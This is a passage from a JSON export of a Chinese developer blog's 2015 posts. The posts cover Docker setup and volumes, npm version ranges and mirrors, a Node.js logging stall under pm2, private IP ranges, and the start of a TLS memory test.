  "body": "<ul class=\"org-ul\">\n<li>安装 <code>docker</code>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">yaourt -S docker\n</pre>\n</div>\n</li>\n\n<li>配置 <code>docker</code>\n\n<p>\n由于 <code>docker</code> 的官方仓库被墙，需要从 <code>dockerpool.com</code> 上下载，修改 <code>docker</code> 配置以免 <code>pull</code> 时出现 tls 相关错误。\n</p>\n\n<p>\n修改 <code>/usr/lib/systemd/system/docker.service</code> 文件，将\n</p>\n\n<pre class=\"example\">\nExecStart=/usr/bin/docker daemon -H fd:// --exec-opt native.cgroupdriver=cgroupfs\n</pre>\n\n<p>\n改为\n</p>\n\n<pre class=\"example\">\nExecStart=/usr/bin/docker daemon --insecure-registry dl.dockerpool.com:5000 -H fd:// --exec-opt native.cgroupdriver=cgroupfs\n</pre>\n\n<p>\n生效配置：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl daemon-reload\n</pre>\n</div>\n</li>\n\n<li>启动 <code>docker</code> 服务\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo systemctl restart docker\n</pre>\n</div>\n</li>\n\n<li>下载 <code>ubuntu14.04</code> 镜像\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker pull <span style=\"color: #66cccc;\">'dl.dockerpool.com:5000/ubuntu:14.04'</span>\n</pre>\n</div>\n</li>\n\n<li>试运行容器\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -t -i <span style=\"color: #66cccc;\">'dl.dockerpool.com:5000/ubuntu:14.04'</span> /bin/bash\n</pre>\n</div>\n</li>\n</ul>\n"
},
{
  "title": "package.json文件dependencies中的各种版本号形式",
  "timestamp": "2015-12-10 17:07:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n查看 <code>package.json</code> 文件时，往往会在 <code>dependencies</code> 下看到各种各样的版本号形式，示例如下：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #66cccc;\">\"dependencies\"</span>: {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"async\"</span>: <span style=\"color: #66cccc;\">\"1.2.1\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"chokidar\"</span>: <span style=\"color: #66cccc;\">\"^1.0.0\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"vizion\"</span>: <span style=\"color: #66cccc;\">\"latest\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"babel\"</span>: <span style=\"color: #66cccc;\">\"^5.x\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"pm2-logs\"</span>: <span style=\"color: #66cccc;\">\"~0.1.1\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"ikt\"</span>: <span style=\"color: #66cccc;\">\"git+http://ikt.pm2.io/ikt.git#master\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"punt\"</span>: <span style=\"color: #66cccc;\">\"*\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"express\"</span>: <span style=\"color: #66cccc;\">\"&gt;=3.0.0\"</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #66cccc;\">\"connect\"</span>: <span style=\"color: #66cccc;\">\"1.30.2 - 2.30.2\"</span>,\n}\n</pre>\n</div>\n\n<p>\n一般自已写 <code>package.json</code> 时，图省事版本号会用 <code>*</code> ，想想也是很危险的，指不定哪天依赖的包不再向后兼容，程序运行估计就有问题了。\n</p>\n\n<p>\n版本号形式是有据可循的，它就是《<a href=\"http://semver.org/lang/zh-CN/\">语义化版本 2.0.0</a>》， <code>npm</code> 遵循该规范，但做了以下扩展：\n</p>\n\n<blockquote>\n<p>\n版本号的构建号部分允许使用 <code>-</code> 字符，所以 <code>0.2.0-1</code> 在《<a href=\"http://semver.org/lang/zh-CN/\">语义化版本 2.0.0</a>》中是非法的，却是合法的 npm 语义版本（Semantic Versioning）。\n</p>\n</blockquote>\n\n<p>\n<code>npm</code> 使用 <a href=\"https://github.com/npm/node-semver\">semver</a> 包进行版本号解析。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">版本号解析示例</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n这篇文章《<a href=\"http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html\">node.js 中的版本管理</a>》对常见的版本号风格进行了解释，虽然对 <code>^</code> 前缀解析不清，但还是值得一看，同时了提供了使用建议。\n</p>\n\n<p>\n版本号格式： <code>主版本号.次版本号.修订号</code>\n</p>\n\n<dl class=\"org-dl\">\n<dt> 1.2.1 </dt><dd>匹配指定版本，这里是匹配1.2.1。\n</dd>\n\n<dt> ^1.0.0 </dt><dd>匹配 &gt;=1.0.0 且 &lt;2.0.0的版本。\n\n<p>\n<code>^</code> 前缀意为 <code>与指定的版本兼容</code> 。\n</p>\n\n<p>\n<code>^</code> 前缀表示最左边的非0段不允许改变，该段之后的段可以为更高版，所以\n</p>\n\n<p>\n^1.1.0 匹配 &gt;=1.1.0 且 &lt;2.0.0\n</p>\n\n<p>\n^0.0.3 匹配 &gt;=0.0.3 且 &lt;0.0.4\n</p>\n</dd>\n\n<dt> latest </dt><dd>当前发布版本。\n\n<p>\n这是一个标记（tag，详见 <a href=\"https://docs.npmjs.com/cli/dist-tag\">dist-tag | npm Documentation</a>），默认情况下 <code>npm install</code> 安装的就是这个 <code>latest</code> 标记。\n常见的标记还有 <code>next</code> <code>stable</code> <code>beta</code> <code>canary</code> 。\n</p>\n</dd>\n\n<dt> ^5.x </dt><dd>匹配 &gt;=5.0.0 且 &lt;6.0.0。\n\n<p>\n<code>X</code>, <code>x</code> 及 <code>*</code> 为通配符，版本号尾部省略的段等同于通配符，所以\n</p>\n\n<ul class=\"org-ul\">\n<li>匹配 &gt;=0.0.0\n</li>\n</ul>\n<p>\n1   匹配 &gt;=1.0.0 且 &lt;2.0.0\n</p>\n\n<p>\n1.2 匹配 &gt;=1.2.0 且 &lt;1.3.0\n</p>\n</dd>\n\n<dt> ~0.1.1 </dt><dd>匹配 &gt;=0.1.1 且 &lt;0.2.0。\n\n<p>\n<code>~</code> 前缀意为 <code>约等于版本</code>\n</p>\n\n<p>\n如果存在次版本号，则允许修订号为更高版，否则允许次版本号为更高版。\n</p>\n\n<p>\n~1 匹配 &gt;=1.0.0 且 &lt;2.0.0\n</p>\n</dd>\n\n<dt> * </dt><dd>匹配 &gt;=0.0.0\n</dd>\n\n<dt> &gt;=3.0.0 </dt><dd>同字面意义 &gt;=3.0.0。\n\n<p>\n其它操作符有 &lt; &lt;= &gt; &gt;= = ，多个表达式之间用 空格 分隔表示并集，用 || 分隔交集。\n</p>\n</dd>\n\n<dt> 1.30.2 - 2.30.2 </dt><dd>匹配 &gt;=1.30.2 且 &lt;=2.30.2\n\n<p>\n尾部缺失的节被替换为0再进行比较，如：1.30 - 2.30.2 同 1.30.0 - 2.30.2。\n</p>\n</dd>\n\n<dt> git+<a href=\"http://ikt.pm2.io/ikt.git#master\">http://ikt.pm2.io/ikt.git#master</a> </dt><dd>Git URL形式的依赖\n\n<p>\n还支持URL、GitHub URL、本地 URL，详见 <a href=\"https://docs.npmjs.com/files/package.json#urls-as-dependencies\">URLs as Dependencies</a>\n</p>\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li><a href=\"https://docs.npmjs.com/files/package.json\">package.json | npm Documentation</a>\n</li>\n\n<li><a href=\"http://blog.nodejitsu.com/package-dependencies-done-right/\">Package.json dependencies done right | Nodejitsu Inc.</a>\n</li>\n\n<li><a href=\"http://deadhorse.me/nodejs/2014/04/27/semver-in-nodejs.html\">node.js 中的版本管理</a>\n</li>\n</ul>\n</div>\n</div>\n"
},
{
  "title": "node.js写日志堵塞问题",
  "timestamp": "2015-12-12 20:19:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n今天遇到一起后台服务中断问题，原因是有一个服务写日志导致磁盘满，清掉日志释放磁盘空间后，服务无法自动恢复，此时有以下症状：\n</p>\n\n<ul class=\"org-ul\">\n<li><code>node.js</code> 进程内存占用超高（超过1G），CPU占用超高（接近100%）\n</li>\n\n<li><a href=\"https://github.com/Unitech/pm2\">pm2</a> 运行异常\n\n<p>\n<code>stop</code> 和 <code>delete</code> 操作会卡住， <code>start</code> 和 <code>restart</code> 操作失败。\n</p>\n\n<p>\n后台有大量 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 进程，应该是 <code>crontab</code> 每分钟调用 <code>pm2 start</code> 确保服务拉起导致。\n</p>\n\n<p>\n<code>killall -9 node</code> 及 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 仍然无法将服务恢复。\n</p>\n\n<p>\n<code>pm2 kill</code> 也会卡住，最终通过 <code>kill -9</code> 干掉 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 的后台进程 <code>PM2 v0.14.3: God Daemon</code> 才把服务重新启动。\n</p>\n</li>\n</ul>\n\n\n<p>\n一个小时后又出现险情，类似的症状，虽然没有严重到中断服务，但是 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 失控很让人揪心，服务开了两个实例，其中一个实例状态：\n</p>\n\n<pre class=\"example\">\n    │ App name          │ id │ mode    │ pid │ status  │ restart │ uptime │ memory │ watching │\n    │ xxx.xxxxxxxxx.com │ 0  │ cluster │ N/A │ errored │ 2       │ 0      │ 0 B    │ disabled │\n</pre>\n\n<p>\n执行 <code>pm2 delete 0</code> 也是挂住，最终还是通过 <code>kill -9</code> 干掉 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 的后台进程 <code>PM2 v0.14.3: God Daemon</code> 才把服务重新启动。\n</p>\n\n<p>\n<code>top</code> 看到的进程状态：\n</p>\n\n<pre class=\"example\">\n PID USER      PR  NI  VIRT  RES  SHR S %CPU   %MEM  TIME+   COMMAND           \n1640 nobody    20   0  793m 149m 8468 R 105.5  0.9   0:34.74 node /usr/local  \n1649 nobody    20   0  796m 152m 8472 R 103.6  1.0   0:34.78 node /usr/local\n</pre>\n\n<p>\n服务输出的日志量在每秒700行（每行不超过120个字符）左右，最终将日志级别调到 <code>error</code> ，几乎不再输出日志，方才将CPU占用降下来：\n</p>\n\n<pre class=\"example\">\n    PID USER      PR  NI  VIRT  RES  SHR S %CPU %MEM  TIME+    COMMAND           \n3527 nobody       20   0  829m 185m 8476 R 62.3  1.2  30:41.12 node /usr/local\n3537 nobody       20   0  825m 181m 8476 R 60.4  1.1  30:45.96 node /usr/local\n</pre>\n\n\n<p>\n我使用的日志模块为 <a href=\"https://github.com/baryon/tracer\">tracer</a> ，简单地通过 <code>tracer.console(options)</code> 实例化全局的日志对象，最终写日志调用的是 <code>console.log</code> 。\n</p>\n\n<p>\n在上层，我使用 <a href=\"https://github.com/Unitech/pm2\">pm2</a> 来做进程管理，使用以下参数启动我的服务：\n</p>\n\n<pre class=\"example\">\npm2 -n xxx.xxxxxxxxx.com -l /usr/local/xxx.xxxxxxxxx.com/run.log --merge-logs start /usr/local/xxx.xxxxxxxxx.com/src/index.js -i 2\n</pre>\n\n<p>\n通过 <code>pm2 describe xxx.xxxxxxxxx.com</code> 输出可以发现最终会写三个日志文件：\n</p>\n\n<pre class=\"example\">\n     │ entire log path   │ /usr/local/xxx.xxxxxxxxx.com/run.log             │\n     │ error log path    │ /root/.pm2/logs/xxx.xxxxxxxxx.com-error.log      │\n     │ out log path      │ /root/.pm2/logs/xxx.xxxxxxxxx.com-out.log        │\n</pre>\n\n<p>\n根据 <a href=\"https://nodejs.org/docs/latest-v0.12.x/api/console.html#console_console\">console的文档</a> 中的描述：\n</p>\n\n<blockquote>\n<p>\nThe console functions are synchronous when the destination is a terminal or a file (to avoid lost messages in case of premature exit) and asynchronous when it's a pipe (to avoid blocking for long periods of time).\n</p>\n\n<p>\n如果输出目标为终端或文件时，console函数是同步的（避免程序过早退出导致丢消息），目标为管道时则为异步（避免长时间堵塞）。\n</p>\n</blockquote>\n\n<p>\n这个特性引起的问题我也在另一篇文章《 <a href=\"http://blog.kankanan.com/article/process.exit-5bfc81f4768463a7523653f08f9351fa4e0d5168.html\">process.exit导致的控制台输出不全</a> 》里有提及。\n</p>\n\n<p>\n也就是说不出意外的话，我们的服务写日志是阻塞式的，每秒钟同步方式写700行日志到一块普通机械硬盘上， <code>node.js</code> 不卡死才怪，更何况这块硬盘上还在被其它服务频繁读写。\n</p>\n\n<p>\n一个服务运行过程中不写日志文件是不可能的，在 <code>node.js</code> 写日志方面需要找到更优的方案。\n</p>\n\n<p>\n但是在寻找更好的方案之前，我做了一个常识性的思考：\n</p>\n\n<blockquote>\n<p>\n将应用程序日志写到磁盘文件的模块，除非它丢弃日志，当磁盘写入无法跟上日志产生的速度，就要暂存到某个地方，它可能是本机的内存或连网的另一台机器。\n</p>\n</blockquote>\n\n<p>\n所以我最终要找的，不仅仅是一个异步写日志文件的模块，还要先减少磁盘写入量，或者日志不直接写到磁盘文件，而是发送到一个日志服务，如果日志是写在本地磁盘，最好能够做到磁盘满时不中断服务，这种情况下丢失日志也是可以接受的。</p>\n"
},
{
  "title": "使用国内镜像加速npm",
  "timestamp": "2015-12-16 17:42:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n使用 <code>npm</code> 安装 <code>node.js</code> 包时会很慢，使用国内镜像可以提高速度。\n</p>\n\n<ul class=\"org-ul\">\n<li>方式一\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm install --registry=https://registry.npm.taobao.org\n</pre>\n</div>\n</li>\n\n<li>方式二\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span style=\"color: #cc99cc;\">export</span> <span style=\"color: #ffcc66;\">npm_config_registry</span>=https://registry.npm.taobao.org\nnpm install\n</pre>\n</div>\n</li>\n\n<li>方式三\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">npm config set <span style=\"color: #ffcc66;\">registry</span>=https://registry.npm.taobao.org\nnpm install\n</pre>\n</div>\n</li>\n</ul>\n\n<p>\n最后再推荐一下 <a href=\"http://npm.taobao.org/\">淘宝 NPM 镜像</a> ，不但有 <code>npm</code> 的镜像，还有 <a href=\"http://npm.taobao.org/mirrors/node\">node.js镜像</a> ，以后安装 <code>node.js</code> 可以更方便了。</p>\n"
},
{
  "title": "node.js服务迁移到docker容器",
  "timestamp": "2015-12-17 16:54:00",
  "tags": [
    "node",
    "docker"
  ],
  "body": "<p>\n这是一篇 <code>docker</code> 实践教程，将 <a href=\"https://github.com/tangxinfa/upload-fiddle\">tangxinfa/upload-fiddle</a> 这个 <code>node.js</code> 服务封装成 <code>docker</code> 容器。\n相关代码已提交到 <a href=\"https://github.com/tangxinfa/upload-fiddle\">tangxinfa/upload-fiddle</a> 项目。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">编写 <code>Dockerfile</code></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<pre class=\"example\">\n<span id=\"coderef-dockerpool\" class=\"coderef-off\"><span class=\"linenr\"> 1: </span>FROM dl.dockerpool.com:5000/ubuntu:14.04</span>\n<span class=\"linenr\"> 2: </span>\n<span class=\"linenr\"> 3: </span>MAINTAINER tangxinfa &lt;tangxinfa@gmail.com&gt;\n<span class=\"linenr\"> 4: </span>\n<span class=\"linenr\"> 5: </span># Change apt sources\n<span id=\"coderef-163-ubuntu\" class=\"coderef-off\"><span class=\"linenr\"> 6: </span>ADD .docker/sources.list /etc/apt/sources.list</span>\n<span class=\"linenr\"> 7: </span>\n<span class=\"linenr\"> 8: </span># Install python\n<span class=\"linenr\"> 9: </span>RUN \\\n<span class=\"linenr\">10: </span>    apt-get update &amp;&amp; apt-get -y -qq install python wget\n<span class=\"linenr\">11: </span>\n<span class=\"linenr\">12: </span># Install node\n<span class=\"linenr\">13: </span>RUN \\\n<span class=\"linenr\">14: </span>    wget http://npm.taobao.org/mirrors/node/v0.12.9/node-v0.12.9-linux-x64.tar.gz &amp;&amp;\\\n<span class=\"linenr\">15: </span>    tar xzf node-v0.12.9-linux-x64.tar.gz -C /usr/local\n<span class=\"linenr\">16: </span>\n<span class=\"linenr\">17: </span>WORKDIR /usr/local/upload-fiddle/\n<span class=\"linenr\">18: </span>\n<span class=\"linenr\">19: </span># Install node modules\n<span class=\"linenr\">20: </span>ADD package.json ./\n<span class=\"linenr\">21: </span>ADD *.bashrc ./\n<span class=\"linenr\">22: </span>RUN \\\n<span class=\"linenr\">23: </span>    ln -s /usr/local/node-v0.12.9-linux-x64 ./node\n<span class=\"linenr\">24: </span>RUN \\\n<span id=\"coderef-npm-taobao\" class=\"coderef-off\"><span class=\"linenr\">25: </span>    [\"/bin/bash\", \"-c\", \"source .bashrc; npm install --registry=https://registry.npm.taobao.org\"]</span>\n<span class=\"linenr\">26: </span>\n<span class=\"linenr\">27: </span># Add project files\n<span class=\"linenr\">28: </span>COPY src ./src\n<span class=\"linenr\">29: </span>COPY config ./config\n<span class=\"linenr\">30: </span>ADD *.sh ./\n<span class=\"linenr\">31: </span>ADD public/*.html ./public/\n<span class=\"linenr\">32: </span>\n<span class=\"linenr\">33: </span># Create directory for upload files.\n<span class=\"linenr\">34: </span>RUN \\\n<span class=\"linenr\">35: </span>    mkdir public/files &amp;&amp;\\\n<span class=\"linenr\">36: </span>    chmod a+w public/files\n<span class=\"linenr\">37: </span>\n<span class=\"linenr\">38: </span># Start service.\n<span id=\"coderef-read\" class=\"coderef-off\"><span class=\"linenr\">39: </span>CMD [\"/bin/bash\", \"-c\", \"./start.sh &amp;&amp; read\"]</span>\n</pre>\n\n<dl class=\"org-dl\">\n<dt> 配置行 <a href=\"#coderef-dockerpool\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-dockerpool');\" onmouseout=\"CodeHighlightOff(this, 'coderef-dockerpool');\">1</a> </dt><dd>在官方仓库被墙的大环境下，使用 <code>dockerpool.com</code> 提供的镜像\n</dd>\n\n<dt> 配置行 <a href=\"#coderef-163-ubuntu\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-163-ubuntu');\" onmouseout=\"CodeHighlightOff(this, 'coderef-163-ubuntu');\">6</a> </dt><dd>使用163的ubuntu源，提高速度\n</dd>\n\n<dt> 配置行 <a href=\"#coderef-npm-taobao\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-npm-taobao');\" onmouseout=\"CodeHighlightOff(this, 'coderef-npm-taobao');\">25</a> </dt><dd>使用taobao的npm源，提高速度\n</dd>\n\n<dt> 配置行 <a href=\"#coderef-read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-read');\">39</a> </dt><dd>调用read命令避免命令退出导致容器停止\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">创建 <code>docker</code> 镜像</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker build -t <span style=\"color: #66cccc;\">'tangxinfa/upload-fiddle:0.0.1'</span> .\n</pre>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">运行 <code>docker</code> 容器</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -idt --name=<span style=\"color: #66cccc;\">'upload-fiddle'</span> -p 127.0.0.1:80:80 <span style=\"color: #66cccc;\">'tangxinfa/upload</span><span style=\"color: #66cccc; text-decoration: underline;\">-fiddle:0.0.1'</span>\n</pre>\n</div>\n\n<p>\n现在可以通过浏览器访问服务了：<a href=\"http://localhost/\">http://localhost/</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">打开 <code>docker</code> 容器终端查看运行日志</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker exec -ti upload-fiddle /bin/bash\ntail -f run.log\n</pre>\n</div>\n\n<p>\n直接 <code>exit</code> 退出终端不会停止容器。</p>\n</div>\n</div>\n"
},
{
  "title": "docker容器数据持久化",
  "timestamp": "2015-12-17 23:24:00",
  "tags": [
    "docker"
  ],
  "body": "<p>\n在上一篇文章《 <a href=\"http:node.js-670d52a18fc179fb5230-docker-5bb95668.html\">node.js服务迁移到docker容器</a> 》中，当容器被删除之后上传的文件将丢失，可以新建一个数据卷容器专门用来保存上传的文件，这个数据卷容器可以为多个应用容器提供数据持久化功能。\n</p>\n\n<p>\n其实也可以挂载本地文件目录做为容器的数据卷，但使用数据卷容器更规范一些。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">创建数据卷容器</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -d -v /usr/local/upload-fiddle/public/files --name upload-fiddle<span style=\"text-decoration: underline;\">-data </span><span style=\"color: #66cccc; text-decoration: underline;\">'dl.dockerpool.com:5000/ubuntu:14.04'</span><span style=\"text-decoration: underline;\"> echo </span><span style=\"color: #66cccc; text-decoration: underline;\">'upload-fiddle data container'</span>\n</pre>\n</div>\n\n<p>\n数据卷容器不需要运行以节约资源，它存在的目的只是对数据卷进行引用，避免数据卷被意外删除。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">挂载数据卷容器</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker run -idt --name=<span style=\"color: #66cccc;\">'upload-fiddle'</span> -p 127.0.0.1:80:80 --volumes-from up<span style=\"text-decoration: underline;\">load-fiddle-data </span><span style=\"color: #66cccc; text-decoration: underline;\">'tangxinfa/upload-fiddle:0.0.1'</span>\n</pre>\n</div>\n\n<p>\n使用 <code>--volumes-from</code> 选项引用容器中的数据卷。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">数据卷容器数据存储位置</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n查看数据卷容器挂载信息\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\">sudo docker inspect -f {{.Mounts}} upload-fiddle-data\n</pre>\n</div>\n\n<p>\n可以看到数据存储在宿主机的 <code>/var/lib/docker/volumes/</code> 目录下。\n</p>\n\n<p>\n数据卷只有当最后一个引用它的容器使用 <code>-v</code> 选项进行删除（ <code>docker rm</code> 命令）时，才会被删除。\n</p>\n\n<p>\n可以使用 <code>docker volume</code> 命令对数据卷进行管理。\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-4\" class=\"outline-2\">\n<h2 id=\"sec-4\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-4\">\n<p>\n《<a href=\"http://container-solutions.com/understanding-volumes-docker/\">Understanding Volumes in Docker - Container Solutions</a>》</p>\n</div>\n</div>\n"
},
{
  "title": "内网IP段有哪些",
  "timestamp": "2015-12-18 14:39:00",
  "tags": [
    "network"
  ],
  "body": "<p>\n常见的内网IP段有：\n</p>\n\n<dl class=\"org-dl\">\n<dt> 10.0.0.0/8 </dt><dd>10.0.0.0 - 10.255.255.255\n</dd>\n\n<dt> 172.16.0.0/12 </dt><dd>172.16.0.0 - 172.31.255.255\n</dd>\n\n<dt> 192.168.0.0/16 </dt><dd>192.168.0.0 - 192.168.255.255\n</dd>\n</dl>\n\n<p>\n以上三个网段分别属于A、B、C三类IP地址，来自 《<a href=\"https://tools.ietf.org/html/rfc1918\">RFC 1918</a>》。\n</p>\n\n<p>\n但是根据 《<a href=\"https://en.wikipedia.org/wiki/Reserved_IP_addresses\">Reserved IP addresses - Wikipedia, the free encyclopedia</a>》 及《<a href=\"https://tools.ietf.org/html/rfc6890\">RFC 6890 - Special-Purpose IP Address Registries</a>》的描述，\n还有很多其它的内网IP段（包括IPv6），以及其它用途的保留IP地址。\n</p>\n\n<p>\n其它IPv4内网段罗列如下：\n</p>\n\n<dl class=\"org-dl\">\n<dt> 0.0.0.0/8 </dt><dd>0.0.0.0 - 0.255.255.255\n\n<p>\n用于当前网络内的广播消息。\n</p>\n</dd>\n\n<dt> 100.64.0.0/10 </dt><dd>100.64.0.0 - 100.127.255.255\n\n<p>\n由运营商使用的私网IP段，随着IPv4地址池的耗光，会有更多用户被分配到这个网段。\n</p>\n</dd>\n\n<dt> 127.0.0.0/8 </dt><dd>127.0.0.0 - 127.255.255.255\n\n<p>\n本机回环地址。\n</p>\n</dd>\n\n<dt> 169.254.0.0/16 </dt><dd>169.254.0.0 - 169.254.255.255\n\n<p>\n获取不到IP地址时使用，通常因为从DHCP服务器获取不到IP。\n</p>\n</dd>\n\n<dt> 192.0.0.0/24 </dt><dd>192.0.0.0 - 192.0.0.255\n\n<p>\nUsed for the IANA IPv4 Special Purpose Address Registry as specified by RFC 5736\n</p>\n\n<p>\n一般用户不可能被分配到这个IP段。\n</p>\n</dd>\n\n<dt> 192.0.2.0/24 </dt><dd>192.0.2.0 - 192.0.2.255\n\n<p>\nAssigned as \"TEST-NET\" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.\n</p>\n\n<p>\n一般用户不可能被分配到这个IP段。\n</p>\n</dd>\n\n<dt> 198.18.0.0/15 </dt><dd>198.18.0.0 - 198.19.255.255\n\n<p>\n用于测试两个独立子网的网间通信。\n</p>\n\n<p>\n一般用户不可能被分配到这个IP段。\n</p>\n</dd>\n\n<dt> 198.51.100.0/24 </dt><dd>198.51.100.0 - 198.51.100.255\n\n<p>\nAssigned as \"TEST-NET-2\" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.\n</p>\n\n<p>\n一般用户不可能被分配到这个IP段。\n</p>\n</dd>\n\n<dt> 203.0.113.0/24 </dt><dd>203.0.113.0 - 203.0.113.255\n\n<p>\nAssigned as \"TEST-NET-3\" in RFC 5737 for use solely in documentation and example source code and should not be used publicly.\n</p>\n\n<p>\n一般用户不可能被分配到这个IP段。\n</p>\n</dd>\n\n<dt> 255.255.255.255/32 </dt><dd>255.255.255.255\n\n<p>\n本网段的广播地址。</p>\n</dd>\n</dl>\n"
},
{
  "title": "tls连接内存占用",
  "timestamp": "2015-12-21 00:17:00",
  "tags": [
    "node"
  ],
  "body": "<p>\n我们有一个 <code>node.js</code> 服务，有大量 <code>tls</code> 长连接，跑了一段时间后发现内存消耗比较大，每个 <code>node.js</code> 实例维持 <code>3000</code> 个连接需要消耗 <code>1G</code> 略多的内存，但是也不能确定有内存泄露，毕竟内存没有再往上涨导致服务中断，所以觉得有必要测试一下 <code>tls</code> 连接的内存消耗情况。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">tls服务器</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">tls</span>         = require(<span style=\"color: #66cccc;\">'tls'</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   fs          = require(<span style=\"color: #66cccc;\">'fs'</span>);\n\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">options</span> = {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   key: fs.readFileSync(<span style=\"color: #66cccc;\">'server.key'</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   cert: fs.readFileSync(<span style=\"color: #66cccc;\">'server.cert'</span>),\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   handshakeTimeout: 10*1000,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   plain: <span style=\"color: #6699cc;\">true</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   ssl: <span style=\"color: #6699cc;\">true</span>\n};\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">port</span> = 1234;\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">tlsServer</span> = tls.createServer(options, <span style=\"color: #99cc99;\">function</span> (<span style=\"color: #ffcc66;\">socket</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   socket.on(<span style=\"color: #66cccc;\">\"close\"</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   console.warn(<span style=\"color: #66cccc;\">'tls client('</span> + socket.remoteAddress + <span style=\"color: #66cccc;\">':'</span> + socket.remoteP<span style=\"text-decoration: underline;\">ort +</span><span style=\"color: #66cccc; text-decoration: underline;\">') closed'</span><span style=\"text-decoration: underline;\">);</span>\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   });\n}).listen(port, <span style=\"color: #66cccc;\">\"0.0.0.0\"</span>, <span style=\"color: #99cc99;\">function</span>(){\n<span 